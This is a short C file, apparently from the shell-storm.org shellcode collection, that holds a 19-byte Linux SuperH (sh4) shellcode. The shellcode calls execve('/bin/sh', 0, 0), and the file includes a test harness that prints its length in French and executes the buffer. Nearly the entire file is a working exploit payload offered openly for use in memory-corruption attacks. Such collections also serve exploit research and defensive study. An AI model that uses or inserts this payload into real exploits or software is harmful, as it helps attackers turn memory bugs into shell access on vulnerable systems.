/*
 | Title:     Linux/SuperH - sh4 execve("/bin/sh", 0, 0) - 19 bytes
 | Date:      2011-06-22
 | Tested on: Debian-sh4 2.6.32-5-sh7751r
 | Author:    Florian Gaultier - agix - twitter: @Agixid
 |
 | http://shell-storm.org
*/

#include <string.h>
#include <stdio.h>

int main(){
char shell[] =
		"\x0b\xe3"//           mov     #11,r3
		"\x02\xc7"//           mova    @(10,pc),r0
		"\x03\x64"//           mov     r0,r4
		"\x5a\x25"//           xor     r5,r5
		"\x6a\x26"//           xor     r6,r6
		"\x02\xc3"//           trapa   #2
		"/bin/sh";

printf("[*] Taille du ShellCode = %d\n", strlen(shell));
(*(void (*)()) shell)();

return 0;
}